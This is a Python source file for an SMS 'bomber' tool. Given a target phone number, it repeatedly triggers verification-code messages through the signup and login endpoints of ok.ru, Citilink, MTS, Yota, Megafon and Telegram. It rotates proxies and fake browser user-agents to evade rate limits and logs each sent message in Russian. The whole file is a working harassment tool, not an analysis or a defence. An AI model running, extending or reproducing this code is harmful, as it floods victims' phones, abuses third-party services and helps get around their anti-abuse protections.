import sqlite3
import datetime
import time
from dateutil.relativedelta import *
import httpx
from fake_useragent import UserAgent
from loguru import logger
import coloredlogs
import verboselogs
import sys
from random import choice

# with httpx.Client() as client:
#     r = client.get("https://", headers=self.getHeaders())

level_styles = {
    "debug": {"color": 8},
    "info": {},
    "warning": {"color": 11},
    "error": {"color": "red"},
    "critical": {"bold": True, "color": "red"},
    "spam": {"color": "green", "faint": True},
    "verbose": {"color": "blue"},
    "notice": {"color": "magenta"},
    "success": {"bold": True, "color": "green"},
}

logfmtstr = "%(asctime)s,%(msecs)03d %(name)s %(levelname)s %(message)s"
logfmt = coloredlogs.ColoredFormatter(logfmtstr, level_styles=level_styles)

logger = verboselogs.VerboseLogger("Benefix")

coloredlogs.install(
    fmt=logfmtstr,
    stream=sys.stdout,
    level_styles=level_styles,
    milliseconds=True,
    level="DEBUG",
    logger=logger,
)


class Bomber:
    def __init__(self, phone):
        self.phone = phone
        self.phone_plus = "+" + phone
        self.phone_parentheses = f"{phone[0]} ({phone[1]}{phone[2]}{phone[3]}) {phone[4]}{phone[5]}{phone[6]}-{phone[7]}{phone[8]}-{phone[9]}{phone[10]}"

        self.path_db = "database.db"
        self.client = httpx.AsyncClient()



    def check(self):
        try:



            with sqlite3.connect(self.path_db) as db:
                task = db.execute("SELECT * FROM tasks WHERE phone = ? AND isStart = ?", (self.phone, "True",)).fetchall()

            use_date = datetime.datetime.now()
            use_date = str(use_date + relativedelta(hours=0)).split(".")[0].split()[1].split(":")
            timer = use_date[0] + use_date[1]

            with sqlite3.connect(self.path_db) as db:
                user_time = db.execute("SELECT * FROM tasks WHERE phone = ? AND isStart = ?", (self.phone, "True",)).fetchall()

            if int(user_time[0][1]) >= int(timer):
                if str(user_time[0][2]) == "True":
                    return True
            else:
                logger.info("Закончилось время, выключаю спам.")
                with sqlite3.connect(self.path_db) as db:
                    db.execute("UPDATE tasks SET isStart = ? WHERE phone = ? AND isStart = ?", ("False", self.phone, "True"))

                return False

            if len(task) <= 0:
                return False
        except Exception as ex:
            return False

    def getHeaders(self):
        self.headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "sec-ch-ua": '"Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
            "User-Agent": UserAgent().chrome,
        }
        # "User-Agent": UserAgent().chrome,

        return self.headers

    def phone_mask(self, phone, maska):
        str_list = list(phone)
        for xxx in str_list:
            maska = maska.replace("#", xxx, 1)
        return maska

    async def benefix(self, type, url, headers=None, data=None, params=None):
        with sqlite3.connect(self.path_db) as db:
            task = db.execute("SELECT * FROM tasks WHERE phone = ? AND isStart = ?", (self.phone, "True",)).fetchall()

        user_id = task[0][4]

        with sqlite3.connect(self.path_db) as db:
            user_info = db.execute("""SELECT * FROM users WHERE user_id = ?""", (user_id,)).fetchall()
        proxy_choice = user_info[0][4]

        i = 0
        while True:
            if i == 5:
                logger.error("Не смог отправить запрос из за невалидных прокси")
                return "Не смог отправить запрос из за невалидных прокси"
                break

            try:
                if proxy_choice == "ipv4":
                    # 5
                    ipv_proxies = str(user_info[0][5]).split("\n")

                    x = choice(ipv_proxies)
                    logger.success(x)
                    PROXYES = {
                        'http': f'http://{x}',
                        'https': f'http://{x}'
                    }

                    if str(type) == "POST":
                        r = await self.client.post(url, headers=headers, data=data, proxies=PROXYES, params=params)
                        return r


                    elif str(type) == "GET":
                        r = await self.client.get(url, headers=headers, proxies=PROXYES)
                        return r


                elif proxy_choice == "http":
                    # 5
                    http_proxies = str(user_info[0][6]).split("\n")

                    x = choice(http_proxies)
                    logger.success(x)
                    PROXYES = {
                        'http': f'http://{x}',
                        'https': f'http://{x}'
                    }

                    if str(type) == "POST":
                        r = await self.client.post(url, headers=headers, data=data, proxies=PROXYES, params=params)
                        return r


                    elif str(type) == "GET":
                        r = await self.client.get(url, headers=headers, proxies=PROXYES)
                        return r

                elif proxy_choice == "socks4":
                    # 5
                    socks4_proxies = str(user_info[0][7]).split("\n")

                    x = choice(socks4_proxies)
                    logger.success(x)
                    PROXYES = {
                        'http': f'http://{x}',
                        'https': f'http://{x}'
                    }

                    if str(type) == "POST":
                        r = await self.client.post(url, headers=headers, data=data, proxies=PROXYES, params=params)
                        return r


                    elif str(type) == "GET":
                        r = await self.client.get(url, headers=headers, proxies=PROXYES)
                        return r
                # none_proxy
                elif str(proxy_choice) == "socks4":

                    if type == "POST":
                        r = await self.client.post(url, headers=headers, data=data, proxies=PROXYES, params=params)
                        return r


                    elif type == "GET":
                        r = await self.client.get(url, headers=headers, proxies=PROXYES)
                        return r

                elif str(proxy_choice) == "none_proxy":

                    if type == "POST":
                        r = await self.client.post(url, headers=headers, data=data, params=params)
                        return r


                    elif type == "GET":
                        r = await self.client.get(url, headers=headers)
                        return r

                else: return "Я не понимаю чего ты хочешь"

            except:
                i += 1
                continue
            i += 1

    async def ok(self):

        if self.check():
            try:

                headers = {
                    "X-Requested-With": "XMLHttpRequest",
                    "Connection": "keep-alive",
                    "Pragma": "no-cache",
                    "Cache-Control": "no-cache",
                    "Accept-Encoding": "gzip, deflate, br",
                    "User-Agent": UserAgent().chrome,
                    "DNT": "1",
                }

                r = await self.benefix("POST", "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", headers=headers, data={"st.r.phone": self.phone_plus})


                time.sleep(3)

                logger.debug(r)
                logger.success(
                    f"[ok.ru] Успешно отправил смс на номер: {self.phone_plus}"
                )

            except Exception as ex:
                logger.error(
                    f"[ok.ru] Не смог отправить смс на номер: {self.phone_plus}"
                )
                logger.debug(ex)
                time.sleep(3)

    async def citilink(self):
        if self.check():
            try:

                headers = {
                    "X-Requested-With": "XMLHttpRequest",
                    "Connection": "keep-alive",
                    "Pragma": "no-cache",
                    "Cache-Control": "no-cache",
                    "Accept-Encoding": "gzip, deflate, br",
                    "User-Agent": UserAgent().chrome,
                    "DNT": "1",
                }

                r = await self.benefix("POST", f"https://www.citilink.ru/registration/confirm/phone/{self.phone_plus}/", headers=headers, data=None)

                logger.debug(r)
                logger.success(
                    f"[citilink] Успешно отправил смс на номер: {self.phone}"
                )
                time.sleep(3)

            except Exception as ex:
                logger.error(f"[citilink] Не смог отправить смс на номер: {self.phone}")
                logger.debug(ex)
                time.sleep(3)

    async def mts(self):
        if self.check():
            try:
                r = await self.benefix("POST",
                    f"https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code/",
                    params={"msisdn": self.phone},
                    headers={
                        "X-Requested-With": "XMLHttpRequest",
                        "Connection": "keep-alive",
                        "Pragma": "no-cache",
                        "Cache-Control": "no-cache",
                        "Accept-Encoding": "gzip, deflate, br",
                        "User-Agent": UserAgent().chrome,
                        "DNT": "1",
                    },
                )

                time.sleep(3)

                r = await self.benefix("POST",
                    f"https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
                    params={"msisdn 799": self.phone},
                    headers={
                        "X-Requested-With": "XMLHttpRequest",
                        "Connection": "keep-alive",
                        "Pragma": "no-cache",
                        "Cache-Control": "no-cache",
                        "Accept-Encoding": "gzip, deflate, br",
                        "User-Agent": UserAgent().chrome,
                        "DNT": "1",
                    },
                )

                logger.debug(r)
                logger.success(f"[mts] Успешно отправил смс на номер: {self.phone}")
                time.sleep(3)
            except Exception as ex:
                logger.error(f"[mts] Не смог отправить смс на номер: {self.phone}")
                logger.debug(ex)
                time.sleep(3)

    async def yota(self):

        if self.check():
            try:
                r = await self.benefix("GET", "https://tv.yota.ru/")
                sesionId = r.cookies["SessionID"]

                r = await self.benefix("POST",
                    f"https://bmp.tv.yota.ru/api/v10/auth/register/msisdn",
                    headers={
                        "X-Requested-With": "XMLHttpRequest",
                        "Connection": "keep-alive",
                        "Pragma": "no-cache",
                        "cookie": f"SessionID={sesionId}",
                        "Cache-Control": "no-cache",
                        "Accept-Encoding": "gzip, deflate, br",
                        "User-Agent": UserAgent().chrome,
                        "DNT": "1",
                    },
                    data={"msisdn": self.phone, "password": "123123"},
                )

                logger.debug(r.json())
                logger.success(f"[yota] Успешно отправил смс на номер: {self.phone}")
                time.sleep(3)
            except Exception as ex:
                logger.error(f"[yota] Не смог отправить смс на номер: {self.phone}")
                logger.debug(ex)
                time.sleep(3)

    async def megafon(self):

        if self.check():
            try:
                r = await self.benefix("GET", "https://megafon.tv/")
                sesionId = r.cookies["SessionID"]

                r = await self.benefix("POST",
                    f"https://bmp.megafon.tv/api/v10/auth/register/msisdn",
                    headers={
                        "X-Requested-With": "XMLHttpRequest",
                        "Connection": "keep-alive",
                        "Pragma": "no-cache",
                        "cookie": f"SessionID={sesionId}",
                        "Cache-Control": "no-cache",
                        "Accept-Encoding": "gzip, deflate, br",
                        "User-Agent": UserAgent().chrome,
                        "DNT": "1",
                    },
                    data={"msisdn": self.phone, "password": "123123"},
                )

                logger.debug(r)
                logger.success(f"[megafon] Успешно отправил смс на номер: {self.phone}")
                time.sleep(3)
            except Exception as ex:
                logger.error(f"[megafon] Не смог отправить смс на номер: {self.phone}")
                logger.debug(ex)
                time.sleep(3)

    async def telegram(self):
        if self.check():
            try:

                headers = {
                    'authority': 'my.telegram.org',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'x-requested-with': 'XMLHttpRequest',
                    'sec-ch-ua-mobile': '?0',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'sec-ch-ua-platform': '"Windows"',
                    'origin': 'https://my.telegram.org',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://my.telegram.org/auth/',
                    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                }

                data = {
                    'phone': self.phone_plus
                }

                r = await self.benefix("POST", "https://my.telegram.org/auth/send_password", headers=headers, data=data)

                logger.debug(r.json())
                logger.success(f"[telegram] Успешно отправил смс на номер: {self.phone}")
                time.sleep(3)
            except Exception as ex:
                logger.error(f"[telegram] Не смог отправить смс на номер: {self.phone}")
                logger.debug(ex)
                time.sleep(3)